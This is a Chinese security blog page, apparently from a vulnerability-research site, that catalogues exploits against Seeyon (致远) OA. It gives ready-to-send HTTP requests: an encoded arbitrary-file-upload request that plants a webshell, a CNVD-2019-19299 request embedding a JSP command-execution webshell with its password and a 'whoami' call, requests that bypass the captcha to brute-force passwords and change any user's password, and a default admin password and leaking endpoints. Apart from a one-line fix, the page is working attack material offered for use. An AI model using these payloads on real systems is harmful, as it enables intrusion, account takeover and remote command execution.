+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Fastjson/fastjson/">Fastjson</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            GitLab
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/GitLab/gitlab/">GitLab</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            IIS
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/IIS/iis/">IIS</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Joomla
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Joomla/joomla/">Joomla</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Nginx
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Nginx/nginx/">Nginx</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            Seeyon-OA(致远)
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file active"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Seeyon-OA(%E8%87%B4%E8%BF%9C)/seeyon-oa/">Seeyon-OA(致远)</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Spring
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Spring/spring/">Spring</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            ThinkCMF
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/ThinkCMF/thinkcmf/">ThinkCMF</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            ThinkPHP
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/ThinkPHP/thinkphp/">Apache-Log4j</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Tongda-OA(通达)
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Tongda-OA(%E9%80%9A%E8%BE%BE)/tongda-oa/">Tongda-OA(通达)</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Weaver-Ecology-OA(泛微)
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Weaver-Ecology-OA(%E6%B3%9B%E5%BE%AE)/weaver-oa/">Weaver-Ecology-OA(泛微)</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Weblogic
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Weblogic/weblogic/">Weblogic</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Wordpress
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Wordpress/wordpress/">Wordpress</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Zabbix
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Zabbix/zabbix/">Zabbix</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Zentao(禅道)
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Zentao(%E7%A6%85%E9%81%93)/zentao/">Zentao(禅道)</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            phpMyAdmin
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/phpMyAdmin/phpmyadmin/">phpMyAdmin</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            编辑器上传漏洞
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/edit-upload/">编辑器上传漏洞</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-【4】漏洞研究/Seeyon-OA(致远)/seeyon-oa" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">【4】漏洞研究</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Seeyon-OA-%E8%87%B4%E8%BF%9C/">Seeyon-OA(致远)</a>
+    </div>
+
+                        
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Seeyon-OA(%E8%87%B4%E8%BF%9C)/seeyon-oa/">
+            <time datetime="2020-12-14T01:55:31.846Z" itemprop="datePublished">2020-12-14</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            Seeyon-OA(致远)
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+        
+        
+            <h2 id="应用简介"><a href="#应用简介" class="headerlink" title="应用简介"></a>应用简介</h2><p>用友 致远OA，协同办公平台</p>
+<h2 id="前台任意文件上传getshell"><a href="#前台任意文件上传getshell" class="headerlink" title="前台任意文件上传getshell"></a>前台任意文件上传getshell</h2><p><strong>漏洞概述</strong></p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响版本</span><br><span class="line">致远OA &lt;A8+ 通杀</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞利用</strong></p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 8819</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure>
+
+<p>冰蝎3 默认马pass：rebeyond</p>
+<p>Webshell地址：127.0.0.1/seeyon/SeeyonUpdate1.jspx</p>
+<h2 id="CNVD-2019-19299-A8未授权代码执行"><a href="#CNVD-2019-19299-A8未授权代码执行" class="headerlink" title="[CNVD-2019-19299]-A8未授权代码执行"></a>[CNVD-2019-19299]-A8未授权代码执行</h2><p><strong>漏洞概述</strong></p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line">致远A8+协同管理软件 V7.0 SP3</span><br><span class="line">致远A8+协同管理软件 V6.1 SP2</span><br></pre></td></tr></table></figure>
+
+<p>该系统的漏洞点在于致远OA-A8系统的Servlet接口暴露，安全过滤处理措施不足，使得用户在无需认证的情况下实现任意文件上传</p>
+<p><strong>漏洞利用</strong></p>
+<p>1、访问<code>/seeyon/htmlofficeservlet</code>出现内容可能存在漏洞</p>
+<p>POC如下</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/htmlofficeservlet</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 1111</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</span><br><span class="line"><span class="attribute">Host</span>: 10.10.10.129</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"></span><br><span class="line">DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV</span><br><span class="line">OPTION=S3WYOSWLBSGr</span><br><span class="line">currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66</span><br><span class="line">CREATEDATE=wUghPB3szB3Xwg66</span><br><span class="line">RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6</span><br><span class="line">originalFileId=wV66</span><br><span class="line">originalCreateDate=wUghPB3szB3Xwg66</span><br><span class="line">FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6</span><br><span class="line">needReadFile=yRWZdAS6</span><br><span class="line">originalCreateDate=wLSGP4oEzLKAz4=iz=66</span><br><span class="line">&lt;%@ page language='java' import='java.util.*,java.io.*'' pageEncoding='UTF-8'%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp+'\n');&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125; %&gt;&lt;%if('u14vfmu8'.equals(request.getParameter('pwd'))&amp;&amp;!''.equals(request.getParameter('cmd')))&#123;out.println('&lt;pre&gt;'+excuteCmd(request.getParameter('cmd')) + '&lt;/pre&gt;');&#125;else&#123;out.println(':-)');&#125;%&gt;6e4f045d4b8506bf492ada7e3390d7ce</span><br></pre></td></tr></table></figure>
+
+<p>然后访问shell即可</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://ip:port/seeyon/test123456.jsp?pwd=u14vfmu8&amp;cmd=cmd+/c+whoami</span><br></pre></td></tr></table></figure>
+
+<p><strong>修复建议</strong></p>
+<p>升级版本</p>
+<h2 id="2015年老洞-A8-v5-任意用户密码修改"><a href="#2015年老洞-A8-v5-任意用户密码修改" class="headerlink" title="[2015年老洞]A8-v5 任意用户密码修改"></a>[2015年老洞]A8-v5 任意用户密码修改</h2><p><strong>漏洞概述</strong></p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line"><span class="attribute">A8-v5</span></span><br></pre></td></tr></table></figure>
+
+<p>一是无视验证码撞库<br>致远A8-V5在设计时存在逻辑错误，用户修改密码时对原密码进行了验证，但是验证使用的服务存在未授权访问漏洞，系统对非合法请求的原密码验证功能进行回应，导致了无视验证码，无需login页面进行密码尝试</p>
+<p>二是任意用户密码修改<br>致远A8-V5在设计时存在逻辑错误，在上一步对原始密码进行验证后，下一步不再检测原始密码，从而直接修改用户密码，导致平行权限的越权漏洞</p>
+<p><strong>漏洞利用</strong></p>
+<p>一、无视验证码撞库，穷举用户和密码</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/seeyon/getAjaxDataServlet?S=ajaxOrgManager&amp;M=isOldPasswordCorrect&amp;CL=true&amp;RVT=XML&amp;P_1_String=admin&amp;P_2_String=wy123456</span> HTTP/1.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-cn</span><br><span class="line"><span class="attribute">Referer</span>: http://a8v51.seeyon.com/seeyon/individualManager.do?method=managerFrame</span><br><span class="line"><span class="attribute">requesttype</span>: AJAX</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span>: </span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line"><span class="attribute">Host</span>: a8v51.seeyon.com</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Proxy-Connection</span>: Keep-Alive</span><br></pre></td></tr></table></figure>
+
+<p>显示true为该用户密码正确，轮询P_1_String参数即可撞库</p>
+<p>二、任意用户密码修改</p>
+<p>在上一步完成之后，页面调转到提交修改密码请求页面</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/individualManager.do?method=modifyIndividual</span> HTTP/1.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html, application/xhtml+xml, */*</span><br><span class="line"><span class="attribute">Referer</span>: http://a8v51.seeyon.com/seeyon/individualManager.do?method=managerFrame</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Proxy-Connection</span>: Keep-Alive</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 86</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Host</span>: a8v51.seeyon.com</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=DA71A65B3AAD45823A1FADAB80A3E685; Hm_lvt_49c0fa7f96aa0a5fb95c62909d5190a6=1419221849,1419232608; avatarImageUrl=8469117046183055270; loginPageURL="/main.do"</span><br><span class="line">individualName=admin&amp;formerpassword=123456&amp;nowpassword=wy123456&amp;validatepass=wy123456</span><br></pre></td></tr></table></figure>
+
+<p>individualName为用户名</p>
+<p>需要以一个合法的JSESSIONID发送如上数据即可修改任意用户密码，合法的JSESSIONID由撞库得出</p>
+<h2 id="A8-V5-log信息泄露"><a href="#A8-V5-log信息泄露" class="headerlink" title="A8-V5 log信息泄露"></a>A8-V5 log信息泄露</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">seeyon/logs/login.log</span></span><br><span class="line"><span class="attribute">seeyon/logs/ctp.log</span></span><br><span class="line"><span class="attribute">seeyon/logs/uc.log</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="A8-V5-未授权访问"><a href="#A8-V5-未授权访问" class="headerlink" title="A8-V5 未授权访问"></a>A8-V5 未授权访问</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">/seeyon/ctp/sysmgr/monitor/cacheDump.do</span><br></pre></td></tr></table></figure>
+
+<h2 id="A8-m企业版v3-20SP1-越权"><a href="#A8-m企业版v3-20SP1-越权" class="headerlink" title="A8-m企业版v3.20SP1 - 越权"></a>A8-m企业版v3.20SP1 - 越权</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">/seeyon/ctp/sysmgr/monitor/cacheDump.do</span><br></pre></td></tr></table></figure>
+
+<h2 id="A8-监控后台默认密码漏洞"><a href="#A8-监控后台默认密码漏洞" class="headerlink" title="A8-监控后台默认密码漏洞"></a>A8-监控后台默认密码漏洞</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/seeyon/management/status.jsp</span><br><span class="line">/seeyon/management/index.jsp</span><br><span class="line">/management/index.jsp</span><br><span class="line"></span><br><span class="line"><span class="attribute">password:WLCCYBD@SEEYON</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="A6-数据库敏感信息泄露"><a href="#A6-数据库敏感信息泄露" class="headerlink" title="A6-数据库敏感信息泄露"></a>A6-数据库敏感信息泄露</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">/createMysql.jsp</span><br><span class="line">/ext/createMysql.jsp</span><br></pre></td></tr></table></figure>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/ThinkPHP/thinkphp/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    Apache-Log4j
+                
+            </div>
+        </a>
+    
+    
+        <a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Tongda-OA(%E9%80%9A%E8%BE%BE)/tongda-oa/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">Tongda-OA(通达)</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
